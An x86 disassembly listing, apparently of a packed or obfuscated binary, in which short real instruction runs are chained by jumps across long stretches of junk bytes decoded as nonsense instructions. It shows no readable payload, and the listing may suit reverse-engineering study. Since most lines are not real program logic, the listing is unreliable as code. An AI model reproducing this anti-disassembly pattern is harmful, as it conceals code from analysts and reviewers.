  415f2b:	les    ecx,FWORD PTR ds:0x85b51dfb
  415f31:	inc    edi
  415f32:	jb     0x415f87
  415f34:	repnz mov al,0xd7
  415f37:	out    dx,al
  415f38:	or     bl,dl
  415f3a:	rol    DWORD PTR [esi+0x552be4e2],1
  415f40:	xchg   ebp,eax
  415f41:	and    dh,BYTE PTR [eax]
  415f43:	cmp    ebx,ebp
  415f45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f46:	cmp    edi,ebp
  415f48:	lods   eax,DWORD PTR ds:[esi]
  415f49:	leave  
  415f4a:	inc    ebx
  415f4b:	pop    ecx
  415f4c:	(bad)  ss:[ecx]
  415f4f:	pusha  
  415f50:	xor    ecx,DWORD PTR [eax]
  415f52:	loope  0x415ee6
  415f54:	ds pop esp
  415f56:	mul    BYTE PTR [esi-0x6f]
  415f59:	xchg   esp,eax
  415f5a:	ins    DWORD PTR es:[edi],dx
  415f5b:	lahf   
  415f5c:	sbb    DWORD PTR [ebx],0xd5d5419d
  415f62:	push   0xffffffd7
  415f64:	loope  0x415eeb
  415f66:	pop    ebp
  415f67:	xor    al,0x55
  415f69:	mov    ebx,0x20c92b96
  415f6e:	shl    BYTE PTR [eax],0xc5
  415f71:	js     0x415f46
  415f73:	jae    0x415f86
  415f75:	ja     0x415f06
  415f77:	mov    dl,0x17
  415f79:	jns    0x415f8b
  415f7b:	mov    ah,BYTE PTR [eax+0x4661fe7d]
  415f81:	and    ebx,0xffffff92
  415f84:	mov    dl,0x8a
  415f86:	cwde   
  415f87:	test   DWORD PTR [edi+0x5fa6796a],0x26c60f69
  415f91:	dec    edi
  415f92:	xor    ebp,ebx
  415f94:	cli    
  415f95:	cmp    eax,0xcd292a1d
  415f9a:	fmul   st,st(5)
  415f9c:	push   edx
  415f9d:	xor    al,BYTE PTR [esi]
  415f9f:	nop    DWORD PTR ds:0x77e15ad7
  415fa6:	add    DWORD PTR [edx+0x6e8efdd6],0x33e55fc2
  415fb0:	leave  
  415fb1:	add    eax,0x66479db3
  415fb6:	adc    ecx,0xffff7223
  415fbc:	xor    eax,0x8dacd260
  415fc1:	xor    ecx,0xacff
  415fc7:	cmp    eax,0xebeb4fd3
  415fcc:	jmp    0x416097
  415fd1:	retf   
  415fd2:	fwait
  415fd3:	xchg   edx,eax
  415fd4:	sbb    eax,0xdfcf1dd2
  415fd9:	mov    bh,0x1d
  415fdb:	sbb    eax,0x931cafcd
  415fe0:	int    0x83
  415fe2:	clc    
  415fe3:	add    BYTE PTR [eax],al
  415fe5:	scas   al,BYTE PTR es:[edi]
  415fe6:	add    BYTE PTR [eax],al
  415fe8:	add    BYTE PTR [edi-0x291d3e2d],bl
  415fee:	mov    al,BYTE PTR [esp+ecx*2-0x18a7ec5e]
  415ff5:	xchg   ecx,eax
  415ff6:	mov    ah,0xd0
  415ff8:	jns    0x415ff9
  415ffa:	xor    DWORD PTR [ecx-0x1d],esi
  415ffd:	jae    0x415fb5
  415fff:	add    eax,0x91222556
  416004:	mov    al,0x4d
  416006:	adc    al,0x65
  416008:	mov    ebx,0x2f62475a
  41600d:	pop    esp
  41600e:	sub    eax,DWORD PTR [ebx+0x4a]
  416011:	out    dx,eax
  416012:	pop    ebx
  416013:	adc    BYTE PTR [ebx+ebx*1-0x40],al
  416017:	mov    fs,WORD PTR [edx+0xd]
  41601a:	lds    eax,FWORD PTR [ebx+0xe]
  41601d:	bound  eax,QWORD PTR [edi-0x7772a214]
  416023:	int3   
  416024:	arpl   WORD PTR [eax-0x467770ec],cx
  41602a:	(bad)  
  41602b:	cmp    esi,ebp
  41602d:	pop    ebx
  41602e:	(bad)  
  41602f:	pop    ebx
  416030:	mov    cl,0x76
  416032:	ins    DWORD PTR es:[edi],dx
  416033:	stos   BYTE PTR es:[edi],al
  416034:	shl    BYTE PTR [eax-0x7a],cl
  416037:	pop    esp
  416038:	shl    BYTE PTR [edi],0x29
  41603b:	and    DWORD PTR [edi-0x52],0x3d
  41603f:	mov    ch,0x23
  416041:	sbb    DWORD PTR [esi+0x451eb535],0x23
  416048:	icebp  
  416049:	add    ebx,DWORD PTR [edx]
  41604b:	(bad)  
  41604c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41604d:	add    al,0x30
  41604f:	dec    edx
  416050:	pusha  
  416051:	or     edi,ecx
  416053:	jp     0x41601d
  416055:	pop    esp
  416056:	mov    edx,0xd9c69dd6
  41605b:	mov    cl,0xb0
  41605d:	dec    ebp
  41605e:	jg     0x416058
  416060:	shr    BYTE PTR [edi-0x2f],1
  416063:	lods   al,BYTE PTR ds:[esi]
  416064:	dec    ebx
  416065:	lea    edi,ds:0x6fe9d0d9
  41606b:	std    
  41606c:	scas   al,BYTE PTR es:[edi]
  41606d:	adc    BYTE PTR [eax+ebp*2],ch
  416070:	push   esi
  416071:	mov    al,ds:0x5b17c3d5
  416076:	or     ch,bh
  416078:	pop    esi
  416079:	je     0x4160b6
  41607b:	pop    edi
  41607c:	cmp    BYTE PTR [esi],bh
  41607e:	sub    ch,BYTE PTR [edi-0x62]
  416081:	jmp    0x41606f
  416083:	shr    BYTE PTR [ebp+0x58],cl
  416086:	stc    
  416087:	pop    ebp
  416088:	fstp   DWORD PTR [eax]
  41608a:	sbb    BYTE PTR [edx+0x20],0x1d
  41608e:	xchg   edx,ebx
  416090:	repnz cwde 
  416092:	jae    0x416075
  416094:	push   0xffffffec
  416096:	jge    0x4160a7
  416098:	test   DWORD PTR [eax+eax*1],ecx
  41609b:	add    BYTE PTR [eax],al
  41609d:	cmp    ecx,0xffffdedc
  4160a3:	je     0x416858
  4160a9:	lea    eax,[ebp-0x10]
  4160ac:	mov    DWORD PTR [ebp-0x88],eax
  4160b2:	mov    eax,DWORD PTR [ebp-0x60]
  4160b5:	mov    DWORD PTR [ebp-0x10],eax
  4160b8:	jmp    0x416183
  4160bd:	cdq    
  4160be:	nop
  4160bf:	add    al,0x7c
  4160c1:	or     eax,0x9ff5f9fc
  4160c6:	hlt    
  4160c7:	bound  ecx,QWORD PTR [esi+0x77]
  4160ca:	sub    al,0x20
  4160cc:	addr16 xor ecx,edi
  4160cf:	add    BYTE PTR [eax],al
  4160d1:	scas   al,BYTE PTR es:[edi]
  4160d2:	add    BYTE PTR [eax],al
  4160d4:	add    BYTE PTR [eax+0x7b],al
  4160d7:	and    eax,DWORD PTR [ebp+edi*4-0x64]
  4160db:	fs cmc 
  4160dd:	inc    edx
  4160de:	nop
  4160df:	lahf   
  4160e0:	iret   
  4160e1:	mov    edi,0x69a6f4b2
  4160e6:	lock cmp DWORD PTR [ebx],0x44
  4160ea:	fld    TBYTE PTR [esi-0x4]
  4160ed:	jae    0x416109
  4160ef:	add    dh,BYTE PTR [eax]
  4160f1:	jecxz  0x416087
  4160f3:	add    al,0x2
  4160f5:	adc    al,0x59
  4160f7:	mov    edi,0x8fe7aad5
  4160fc:	cmp    ecx,DWORD PTR [ebx]
  4160fe:	popa   
  4160ff:	cdq    
  416100:	cmc    
  416101:	xor    DWORD PTR [edx+0x25e06b5e],esp
  416107:	in     eax,dx
  416108:	cli    
  416109:	ret    
  41610a:	test   DWORD PTR es:[bx+si-0x4682],0xbae5d401
  416114:	pop    edx
  416115:	retf   0x82ba
  416118:	mov    ds:0x4c15c95e,eax
  41611d:	ja     0x416166
  41611f:	imul   ebx,DWORD PTR [edi+eiz*1],0xb1e5fd2
  416126:	and    eax,0xaddd47de
  41612b:	sub    esp,DWORD PTR [ebx-0x7bd30673]
  416131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416132:	dec    ecx
  416133:	loope  0x416184
  416135:	push   es
  416136:	push   cs
  416137:	xlat   BYTE PTR ds:[ebx]
  416138:	and    BYTE PTR [ebp+0x75],ch
  41613b:	adc    eax,0xc16aa8f7
  416140:	pop    edx
  416141:	jge    0x416177
  416143:	jbe    0x4160f0
  416145:	adc    al,0xca
  416147:	addr16 xchg esi,eax
  416149:	shr    BYTE PTR [esi+eax*2],cl
  41614c:	mov    ds:0x6d4aa1fb,eax
  416151:	xchg   BYTE PTR [ebx+0x3f],bl
  416154:	push   eax
  416155:	mov    ebp,esi
  416157:	popa   
  416158:	adc    BYTE PTR [ecx+0x79],bh
  41615b:	call   0x82c00ac6
  416160:	lods   al,BYTE PTR ds:[esi]
  416161:	xlat   BYTE PTR ds:[ebx]
  416162:	hlt    
  416163:	lahf   
  416164:	pushf  
  416165:	xchg   BYTE PTR [esi-0x27f76e1d],ah
  41616b:	push   cs
  41616c:	inc    ebx
  41616d:	push   ds
  41616e:	test   DWORD PTR [ecx],ecx
  416170:	data16 adc al,0xe2
  416173:	cmp    ecx,edi
  416175:	scas   eax,DWORD PTR es:[edi]
  416176:	cmc    
  416177:	retf   0x2f9b
  41617a:	sbb    al,0x8b
  41617c:	in     eax,dx
  41617d:	fdiv   QWORD PTR [eax+0x29f45575]
  416183:	mov    eax,DWORD PTR [ebp-0x10]
  416186:	jmp    0x416251
  41618b:	push   eax
  41618c:	rcl    BYTE PTR [eax+ecx*1-0x2723b36c],1
  416193:	mov    esi,0x381c8c43
  416198:	dec    ebp
  416199:	mov    esi,0xf9df92
  41619e:	add    BYTE PTR [esi-0x4b000000],ch
  4161a4:	sub    esp,DWORD PTR [edx]
  4161a6:	mov    DWORD PTR [ebx-0x24cfa996],ebx
  4161ac:	out    dx,eax
  4161ad:	dec    ecx
  4161ae:	xor    dh,ch
  4161b0:	and    eax,0xba236eb6
  4161b5:	ret    
  4161b6:	fldpi  
  4161b8:	jmp    0x2010bac
  4161bd:	and    al,0x6d
  4161bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161c1:	jne    0x41615d
  4161c3:	jmp    0x56add886
  4161c8:	arpl   WORD PTR [ebx],ax
  4161ca:	mov    eax,ds:0x483ef46a
  4161cf:	ret    
  4161d0:	sub    eax,0x5af829bb
  4161d5:	add    eax,0x218edfc2
  4161da:	outs   dx,DWORD PTR ds:[esi]
  4161db:	mov    ebp,esp
  4161dd:	shr    DWORD PTR [eax],cl
  4161df:	ret    0xac80
  4161e2:	dec    esi
  4161e3:	push   ecx
  4161e4:	fdiv   DWORD PTR es:[eiz*2+0x6391f2a5]
  4161ec:	add    DWORD PTR [ebx+0x1fbc4ad2],eax
  4161f2:	sbb    dh,al
  4161f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161f5:	inc    esi
  4161f6:	add    BYTE PTR [edx+0x5c62ba0a],ah
  4161fc:	mov    dh,0x4b
  4161fe:	loope  0x416245
  416200:	jge    0x416219
  416202:	fcomp  QWORD PTR [esi]
  416204:	test   al,0x98
  416206:	mov    al,0x51
  416208:	call   0x30b405d6
  41620d:	jo     0x4161af
  41620f:	in     al,dx
  416210:	jl     0x41625e
  416212:	leave  
  416213:	int3   
  416214:	mov    esi,0x2e457827
  416219:	xchg   ecx,eax
  41621a:	cmp    ecx,edx
  41621c:	bound  esp,QWORD PTR [esi]
  41621e:	gs ds jne 0x416255
  416222:	mov    eax,0x201e7f68
  416227:	sar    DWORD PTR [ebx],1
  416229:	push   ebx
  41622a:	and    eax,0x9ced84ba
  41622f:	add    DWORD PTR [edi],esi
  416231:	lods   eax,DWORD PTR ds:[esi]
  416232:	or     BYTE PTR [edi],cl
  416234:	dec    ebx
  416235:	shl    DWORD PTR ds:0x952e171d,0xa
  41623c:	lock cmp BYTE PTR [edi-0xe9d9fab],dh
  416243:	jns    0x4161f4
  416245:	push   0x10
  416247:	push   ebp
  416248:	inc    esp
  416249:	ret    
  41624a:	adc    BYTE PTR [edi+0x6f],dh
  41624d:	dec    esi
  41624e:	cmp    ch,BYTE PTR [esi+0x1]
  416251:	mov    ecx,DWORD PTR [ebp-0x4]
  416254:	sub    eax,ecx
  416256:	mov    DWORD PTR [ebp-0x10],eax
  416259:	jmp    0x416324
  41625e:	and    bh,BYTE PTR [ecx]
  416260:	pop    edi
  416261:	xchg   edi,eax
  416262:	pop    edi
  416263:	imul   edx
  416265:	mov    ebp,0x5fd3f27f
  41626a:	mov    esi,0x8dbf5cb9
  41626f:	cli    
  416270:	add    BYTE PTR [eax],al
  416272:	scas   al,BYTE PTR es:[edi]
  416273:	add    BYTE PTR [eax],al
  416275:	add    BYTE PTR [edi],bh
  416277:	jge    0x416201
  416279:	mov    ?,WORD PTR [eax+0x28cfc12f]
  41627f:	jae    0x416241
  416281:	jge    0x416206
  416283:	jo     0x416235
  416285:	inc    esp
  416286:	sub    eax,0x9589b01b
  41628b:	xlat   BYTE PTR ds:[ebx]
  41628c:	or     esp,DWORD PTR [esi]
  41628e:	repnz ins BYTE PTR es:[edi],dx
  416290:	jbe    0x416248
  416292:	adc    al,0x68
  416294:	sar    BYTE PTR [esp+edi*2-0x2720e494],cl
  41629b:	add    BYTE PTR [ebp+edx*8-0x1e279b1],cl
  4162a2:	push   eax
  4162a3:	add    DWORD PTR [edx+0x39],edi
  4162a6:	out    dx,al
  4162a7:	bound  esp,QWORD PTR [edx]
  4162a9:	mov    dl,0xc8
  4162ab:	lods   eax,DWORD PTR ds:[esi]
  4162ac:	int3   
  4162ad:	mov    ch,0x5a
  4162af:	mov    ebx,0x8c95b1da
  4162b4:	lods   eax,DWORD PTR ds:[esi]
  4162b5:	cli    
  4162b6:	xchg   edx,eax
  4162b7:	xlat   BYTE PTR ds:[ebx]
  4162b8:	xchg   ecx,eax
  4162b9:	mov    esi,0x90d8d786
  4162be:	loopne 0x416258
  4162c0:	adc    eax,0xfffffff7
  4162c3:	jns    0x41631c
  4162c5:	ror    BYTE PTR [esi],1
  4162c7:	dec    ebp
  4162c8:	aam    0x82
  4162ca:	call   DWORD PTR [edi]
  4162cc:	mov    esi,0x42ea2d9d
  4162d1:	test   esp,edi
  4162d3:	shl    DWORD PTR [eax+0x3009c6ad],1
  4162d9:	pusha  
  4162da:	push   cs
  4162db:	xchg   esi,eax
  4162dc:	mov    ecx,0x3c042bf9
  4162e1:	std    
  4162e2:	mov    ecx,0x2d93f049
  4162e7:	call   0x1520d8ae
  4162ec:	jno    0x416277
  4162ee:	out    dx,al
  4162ef:	pop    esi
  4162f0:	dec    eax
  4162f1:	inc    edi
  4162f2:	xchg   ecx,eax
  4162f3:	fs push esi
  4162f5:	aad    0x9
  4162f7:	xchg   edi,eax
  4162f8:	push   ecx
  4162f9:	jbe    0x41636b
  4162fb:	in     al,dx
  4162fc:	arpl   WORD PTR [ecx+0x7f2dcfb1],cx
  416302:	inc    edx
  416303:	push   ss
  416304:	repz retf 
  416306:	push   0xb987a01f
  41630b:	dec    esp
  41630c:	mov    esi,0x23ce96f7
  416311:	sub    DWORD PTR [esi-0x188dc64e],esp
  416317:	fucomi st,st(5)
  416319:	pop    ebp
  41631a:	jb     0x416398
  41631c:	repz test al,0x1b
  41631f:	push   es
  416320:	loopne 0x4162c2
  416322:	int3   
  416323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416324:	mov    eax,DWORD PTR [ebp-0x20]
  416327:	mov    ecx,DWORD PTR [ebp-0x1c]
  41632a:	sub    DWORD PTR [ebp-0x10],eax
  41632d:	mov    eax,DWORD PTR [ebp-0x4]
  416330:	jmp    0x4163fb
  416335:	jle    0x416317
  416337:	and    eax,0x7ef5bf31
  41633c:	out    dx,eax
  41633d:	jnp    0x41635c
  41633f:	out    dx,al
  416340:	in     al,0xcc
  416342:	enter  0x33c5,0x3b
  416346:	sti    
  416347:	add    BYTE PTR [eax],al
  416349:	scas   al,BYTE PTR es:[edi]
  41634a:	add    BYTE PTR [eax],al
  41634c:	add    BYTE PTR [ebx+0x56257450],bh
  416352:	cdq    
  416353:	call   esi
  416355:	add    al,0x86
  416357:	or     eax,0x2be3ae0f
  41635c:	add    dh,cl
  41635e:	add    eax,0x57f51538
  416363:	mov    dl,0x1e
  416365:	inc    ebp
  416366:	aam    0x9c
  416368:	cld    
  416369:	neg    DWORD PTR [edi+ebx*4+0x787dda7d]
  416370:	(bad)  
  416371:	fdiv   st(6),st
  416373:	ja     0x41638b
  416375:	jge    0x416303
  416377:	sahf   
  416378:	xor    al,0xcc
  41637a:	xor    bl,ah
  41637c:	or     eax,0xd20017b2
  416381:	sbb    al,0xd0
  416383:	mov    WORD PTR [eax],es
  416385:	mov    ss,ecx
  416387:	xor    bl,BYTE PTR [ecx]
  416389:	ret    0x6e5e
  41638c:	jnp    0x416396
  41638e:	ret    0x9c43
  416391:	jb     0x416318
  416393:	fwait
  416394:	add    al,0x77
  416396:	adc    ch,BYTE PTR [ecx-0x4e]
  416399:	cmc    
  41639a:	jl     0x41633a
  41639c:	push   0xb84dea22
  4163a1:	push   0x358e3b63
  4163a6:	pusha  
  4163a7:	(bad)  
  4163a8:	out    0x21,eax
  4163aa:	add    bh,BYTE PTR [ebx+0x50]
  4163ad:	and    BYTE PTR [edi+edi*1-0x2d82af7b],bh
  4163b4:	js     0x4163e5
  4163b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163b7:	pop    edi
  4163b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163b9:	(bad)  
  4163ba:	lea    ecx,[ecx]
  4163bc:	rol    BYTE PTR ds:0xb5a87f53,1
  4163c2:	(bad)  
  4163c3:	adc    bh,BYTE PTR [ecx+0x3a]
  4163c6:	dec    eax
  4163c7:	popa   
  4163c8:	mov    esi,ecx
  4163ca:	aas    
  4163cb:	bound  ebx,QWORD PTR [esi+edx*1+0x67f8f160]
  4163d2:	in     eax,dx
  4163d3:	cmp    edx,eax
  4163d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163d6:	adc    bh,BYTE PTR [ebx+0x7685ac75]
  4163dc:	cmp    edi,DWORD PTR [eax-0x27e1a53c]
  4163e2:	mov    ds:0x6ac313fe,al
  4163e7:	pop    edi
  4163e8:	mov    edx,0xb1498366
  4163ed:	(bad)  
  4163ee:	jle    0x4163e2
  4163f0:	(bad)  [esi-0x13]
  4163f3:	push   ebx
  4163f4:	sti    
  4163f5:	and    BYTE PTR [eax+0x914c10b],al
  4163fb:	mov    DWORD PTR [eax],0x455655e9
  416401:	jmp    0x4164cc
  416406:	cmc    
  416407:	int3   
  416408:	mov    ah,0xd6
  41640a:	mov    ebp,0x76eff7fe
  41640f:	lods   al,BYTE PTR ds:[esi]
  416410:	mov    edx,0x2f8e2092
  416415:	aas    
  416416:	jmp    0xae416516
  41641b:	add    BYTE PTR [eax],al
  41641d:	add    BYTE PTR [edx],bl
  41641f:	dec    eax
  416420:	addr16 pop edi
  416422:	enter  0x15d5,0x72
  416426:	cld    
  416427:	retf   0xd5af
  41642a:	inc    edi
  41642b:	mov    ds:0xf931b5e,eax
  416430:	ins    DWORD PTR es:[edi],dx
  416431:	sub    ebp,esi
  416433:	stos   BYTE PTR es:[edi],al
  416434:	loop   0x4164b5
  416436:	leave  
  416437:	clc    
  416438:	jge    0x41641a
  41643a:	ja     0x416487
  41643c:	(bad)  
  41643d:	clc    
  41643e:	push   DWORD PTR [eax-0x47]
  416441:	ss mov ebx,0xc220ddc2
  416447:	int3   
  416448:	imul   esi,DWORD PTR [ebp+0x1dad9e25],0x25ae9bf8
  416452:	sbb    DWORD PTR [edi+0x7b],eax
  416455:	or     dl,bh
  416457:	(bad)
  41645a:	xor    al,0x3b
  41645c:	fimul  WORD PTR [ebx]
  41645e:	(bad)
  416462:	pop    edx
  416463:	or     dl,BYTE PTR [ebx+ecx*1+0x165cebb9]
  41646a:	mov    edx,DWORD PTR [esi+0x5be6fcc7]
  416470:	in     eax,dx
  416471:	push   0xfffffff7
  416473:	mov    ecx,0xff9e7645
  416478:	mov    BYTE PTR [ebx-0x25001e85],ah
  41647e:	dec    ebx
  41647f:	cmp    ah,BYTE PTR [ebx+0x28e6444a]
  416485:	inc    di
  416487:	mov    esp,0x74fac892
  41648c:	adc    al,0xe9
  41648e:	int    0xbe
  416490:	mov    ecx,DWORD PTR [esi-0x63]
  416493:	adc    BYTE PTR [ebp-0x17201000],cl
  416499:	(bad)  
  41649a:	sub    DWORD PTR [ebp+0x7],esp
  41649d:	leave  
  41649e:	stos   BYTE PTR es:[edi],al
  41649f:	mov    ebx,0xdb74a447
  4164a4:	cmc    
  4164a5:	out    dx,eax
  4164a6:	cmp    eax,0x69ffd046
  4164ab:	sbb    al,0x9a
  4164ad:	mov    dh,0x6f
  4164af:	push   esi
  4164b0:	out    dx,eax
  4164b1:	imul   ecx,edx,0x34
  4164b4:	xor    al,ch
  4164b6:	leave  
  4164b7:	sbb    al,0x1d
  4164b9:	xchg   ebx,eax
  4164ba:	push   ebx
  4164bb:	lea    eax,[eax+0x7]
  4164be:	out    dx,eax
  4164bf:	data16 ss fyl2x 
  4164c3:	add    al,BYTE PTR ds:0x65e0a389
  4164c9:	jo     0x41644d
  4164cb:	xlat   BYTE PTR ds:[ebx]
  4164cc:	mov    DWORD PTR [eax+0x4],0x77575466
  4164d3:	mov    eax,DWORD PTR [ebp-0x10]
  4164d6:	jmp    0x4165a1
  4164db:	sub    esp,DWORD PTR [esp-0x406f5070]
  4164e2:	mov    edi,0xbb193d74
  4164e7:	std    
  4164e8:	push   cs
  4164e9:	mov    esi,0xfc974e
  4164ee:	add    BYTE PTR [esi-0x71000000],ch
  4164f4:	scas   eax,DWORD PTR es:[edi]
  4164f5:	pop    edx
  4164f6:	les    ebp,FWORD PTR [ecx-0x5]
  4164f9:	xor    DWORD PTR [edx-0x44],ecx
  4164fc:	cmp    eax,0x6516d32b
  416501:	(bad)  
  416505:	cli    
  416506:	xor    eax,0xb2dafbbd
  41650b:	lock xchg edi,eax
  41650d:	cs jo  0x416563
  416510:	test   al,0x17
  416512:	sub    DWORD PTR [ebx-0x30647887],eax
  416518:	sub    esi,DWORD PTR [ebp+0x1a]
  41651b:	jae    0x416577
  41651d:	mov    esi,0xaa96cb98
  416522:	ins    DWORD PTR es:[edi],dx
  416523:	pop    ecx
  416524:	shl    ebx,0x15
  416527:	in     al,0xcc
  416529:	lods   al,BYTE PTR ds:[esi]
  41652a:	test   eax,0x5bf76f77
  41652f:	rcl    DWORD PTR [edi+0x15],0x88
  416533:	sti    
  416534:	sub    BYTE PTR [eax+0x13],bl
  416537:	(bad)  
  416538:	imul   ebx,DWORD PTR fs:0x294cb8e5,0x64
  416540:	loop   0x4164d3
  416542:	fcom   DWORD PTR [edi*8-0x2401b234]
  416549:	jg     0x41651a
  41654b:	jp     0x416542
  41654d:	push   0xffffffa1
  41654f:	(bad)  
  416550:	mov    eax,0x3ef13eb0
  416555:	xchg   edi,eax
  416556:	mov    bl,0xea
  416558:	aaa    
  416559:	and    al,0xfe
  41655b:	cli    
  41655c:	cmp    eax,0x2c2365d4
  416561:	scas   eax,DWORD PTR es:[edi]
  416562:	inc    esi
  416563:	adc    ebx,DWORD PTR ds:0x9d6350da
  416569:	popw   es
  41656b:	inc    edi
  41656c:	scas   eax,DWORD PTR es:[edi]
  41656d:	sbb    esp,ebp
  41656f:	mov    esi,0xd7ecfd57
  416574:	pop    eax
  416575:	pop    ecx
  416576:	scas   eax,DWORD PTR es:[edi]
  416577:	fld    DWORD PTR [ecx-0x1ededa3b]
  41657d:	inc    ebp
  41657e:	dec    esi
  41657f:	pop    esi
  416580:	mov    esp,0xe215b2c5
  416585:	gs jle 0x4165a6
  416588:	sbb    al,BYTE PTR [esi+0x3d]
  41658b:	not    DWORD PTR [edi+0x3945d5cd]
  416591:	xor    DWORD PTR [si-0x44],esp
  416595:	inc    edi
  416596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416597:	mov    WORD PTR [ebp-0x7402bbba],fs
  41659d:	inc    edi
  41659e:	sbb    DWORD PTR [ecx],esi
  4165a0:	jge    0x41652d
  4165a2:	dec    ebp
  4165a3:	cld    
  4165a4:	mov    DWORD PTR [ecx+0x1],eax
  4165a7:	mov    eax,ds:0x433030
  4165ac:	jmp    0x416677
  4165b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165b2:	std    
  4165b3:	inc    ecx
  4165b4:	ss pop ebx
  4165b6:	mov    esi,0x92dfdf7
  4165bb:	and    bh,BYTE PTR [esi+edx*2+0x45cdd3fd]
  4165c2:	std    
  4165c3:	add    BYTE PTR [eax],al
  4165c5:	scas   al,BYTE PTR es:[edi]
  4165c6:	add    BYTE PTR [eax],al
  4165c8:	add    BYTE PTR [ebp+eax*4+0x2b],cl
  4165cc:	and    al,0x88
  4165ce:	mov    esp,0xc914c9df
  4165d3:	lods   al,BYTE PTR ds:[esi]
  4165d4:	loop   0x41664e
  4165d6:	test   al,0x4e
  4165d8:	fwait
  4165d9:	aad    0x3
  4165db:	jnp    0x41660a
  4165dd:	adc    bh,bh
  4165df:	jnp    0x41660d
  4165e1:	fistp  WORD PTR [ecx]
  4165e3:	in     eax,0xee
  4165e5:	ret    0x1850
  4165e8:	xor    ebx,0x68190613
  4165ee:	adc    eax,edi
  4165f0:	ss cs aas 
  4165f3:	arpl   WORD PTR [esi-0x66a457f4],si
  4165f9:	cmp    BYTE PTR [edx-0x75],al
  4165fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165fd:	dec    ebx
  4165fe:	fwait
  4165ff:	xor    eax,0x41bd9159
  416604:	dec    ecx
  416605:	(bad)  
  416606:	sub    ah,al
  416608:	xchg   ebx,eax
  416609:	pop    es
  41660a:	iret   
  41660b:	mov    BYTE PTR [edi-0x76],ch
  41660e:	mov    cl,0x47
  416610:	nop
  416611:	add    BYTE PTR [edx],bl
  416613:	add    eax,0x85e7f71e
  416618:	pop    edi
  416619:	mov    esi,0x2c138adb
  41661e:	push   ebx
  41661f:	mov    ebx,0x23d796af
  416624:	push   edi
  416625:	push   ss
  416626:	retf   
  416627:	stos   DWORD PTR es:[edi],eax
  416628:	dec    ebp
  416629:	mov    edi,DWORD PTR [ecx-0x44]
  41662c:	leave  
  41662d:	or     ah,al
  41662f:	mov    edi,0x85af125c
  416634:	ss mov bh,0xdc
  416637:	xchg   esp,eax
  416638:	adc    cl,cl
  41663a:	hlt    
  41663b:	mov    ch,0xb
  41663d:	cmp    esp,DWORD PTR [ebp-0x61e2116e]
  416643:	xchg   bl,ch
  416645:	xlat   BYTE PTR ds:[ebx]
  416646:	pop    eax
  416647:	stos   DWORD PTR es:[edi],eax
  416648:	dec    eax
  416649:	cmp    al,0x3d
  41664b:	pop    esi
  41664c:	pushf  
  41664d:	lods   al,BYTE PTR ds:[esi]
  41664e:	dec    eax
  41664f:	xchg   ebp,edi
  416651:	aam    0x1b
  416653:	sub    BYTE PTR cs:[esi+0x1b325c7b],dl
  41665a:	shr    cl,cl
  41665c:	jnp    0x416621
  41665e:	push   ebx
  41665f:	inc    ebx
  416660:	les    esi,FWORD PTR [esi-0x28]
  416663:	out    0x90,eax
  416665:	jecxz  0x41660f
  416667:	call   0x9e81852c
  41666c:	stos   DWORD PTR es:[edi],eax
  41666d:	aam    0xfb
  41666f:	es enter 0x9ea,0xf5
  416674:	dec    edx
  416675:	inc    eax
  416676:	(bad)  
  416678:	xor    bh,bh
  41667a:	xor    eax,0x433294
  41667f:	push   DWORD PTR ds:0x433038
  416685:	push   DWORD PTR ds:0x433274
  41668b:	push   DWORD PTR ds:0x43330c
  416691:	jmp    0x41675c
  416696:	in     al,0x78
  416698:	jg     0x41667b
  41669a:	jmp    edi
  41669c:	(bad)  
  41669d:	jge    0x416631
  41669f:	or     al,0x48
  4166a1:	addr16 (bad) 
  4166a3:	out    dx,al
  4166a4:	scas   eax,DWORD PTR es:[edi]
  4166a5:	mov    ebx,0xfdf3
  4166aa:	scas   al,BYTE PTR es:[edi]
  4166ab:	add    BYTE PTR [eax],al
  4166ad:	add    BYTE PTR [esi+0x7bcb4ecf],bh
  4166b3:	xchg   edi,eax
  4166b4:	aaa    
  4166b5:	add    eax,0xa6fb2861
  4166ba:	gs adc eax,edi
  4166bd:	jns    0x416724
  4166bf:	stc    
  4166c0:	pop    edi
  4166c1:	mov    edi,0xc1c0b67a
  4166c6:	fwait
  4166c7:	retf   
  4166c8:	push   esp
  4166c9:	aas    
  4166ca:	sub    eax,0x788d303c
  4166cf:	jp     0x416713
  4166d1:	iret   
  4166d2:	test   al,0x52
  4166d4:	in     al,0x94
  4166d6:	repz adc esi,DWORD PTR [ebp+0x1f]
  4166da:	fmul   DWORD PTR [ecx+0x4f]
  4166dd:	xchg   ebp,eax
  4166de:	in     eax,dx
  4166df:	jno    0x4166fd
  4166e1:	push   cs
  4166e2:	data16 loop 0x41671f
  4166e5:	mov    ebp,0x92709b81
  4166ea:	adc    DWORD PTR ss:[ecx-0x5c9005b3],ecx
  4166f1:	push   esp
  4166f2:	jp     0x41671f
  4166f4:	(bad)  
  4166f6:	aaa    
  4166f7:	push   cs
  4166f8:	or     DWORD PTR ds:0x49013750,ecx
  4166fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166ff:	cmp    al,0x58
  416701:	inc    edx
  416702:	iret   
  416703:	int3   
  416704:	mov    dh,0xb3
  416706:	imul   eax,DWORD PTR [ebx],0xffffffa0
  416709:	imul   esi,DWORD PTR [edx-0x2e60b10d],0xb63be652
  416713:	jecxz  0x4166ce
  416715:	mov    ds:0x63a116fb,eax
  41671a:	sbb    al,0xf7
  41671c:	xor    edi,edx
  41671e:	js     0x4166ce
  416720:	and    al,0x70
  416722:	add    esi,DWORD PTR [edi]
  416724:	dec    ecx
  416725:	push   ebx
  416726:	fnstcw WORD PTR ds:0xafa834e4
  41672c:	mov    dl,0x10
  41672e:	push   esp
  41672f:	mov    eax,ss:0x72658e82
  416735:	out    0x6d,al
